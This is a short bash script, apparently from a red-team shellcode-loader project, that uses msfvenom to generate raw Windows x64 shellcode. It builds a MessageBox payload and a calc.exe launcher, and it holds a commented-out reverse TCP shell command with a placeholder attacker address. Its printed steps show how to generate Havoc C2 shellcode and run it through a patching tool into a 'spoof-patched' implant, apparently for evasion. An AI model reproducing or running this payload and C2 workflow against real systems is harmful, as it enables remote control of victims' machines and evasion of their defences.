#!/bin/bash
# Generate test shellcode payloads using msfvenom
# Run from Kali Linux

BINDIR="../binfile"
mkdir -p "$BINDIR"

echo "[*] Generating test shellcode payloads..."

# 1. MessageBox shellcode (benign - shows a popup)
echo "[+] Generating message.bin (MessageBox)"
msfvenom -p windows/x64/messagebox TEXT="Hello from shellcode!" TITLE="PoC Test" \
    -f raw -o "$BINDIR/message.bin" 2>/dev/null
echo "    Size: $(wc -c < "$BINDIR/message.bin") bytes"

# 2. calc.exe launcher (benign - spawns calculator)
echo "[+] Generating calcPatched.bin (calc.exe)"
msfvenom -p windows/x64/exec CMD="calc.exe" \
    -f raw -o "$BINDIR/calcPatched.bin" 2>/dev/null
echo "    Size: $(wc -c < "$BINDIR/calcPatched.bin") bytes"

# 3. Reverse shell (for testing with netcat - NOT for Havoc)
echo "[+] Generating reverse_shell.bin (reverse TCP)"
echo "    Configure LHOST and LPORT before use!"
# msfvenom -p windows/x64/shell_reverse_tcp LHOST=YOUR_IP LPORT=4444 \
#     -f raw -o "$BINDIR/reverse_shell.bin"

echo ""
echo "[*] For Havoc C2 shellcode:"
echo "    1. Start Havoc teamserver"
echo "    2. Generate payload: Payloads > Generate > Shellcode (Raw)"
echo "    3. Save as: $BINDIR/havocDefault.bin"
echo "    4. Patch with: python tools/mypatch.py $BINDIR/havocDefault.bin $BINDIR/havocSpoofPatched.bin"
echo ""
echo "[+] Done. Shellcode files in $BINDIR/"
ls -la "$BINDIR/"
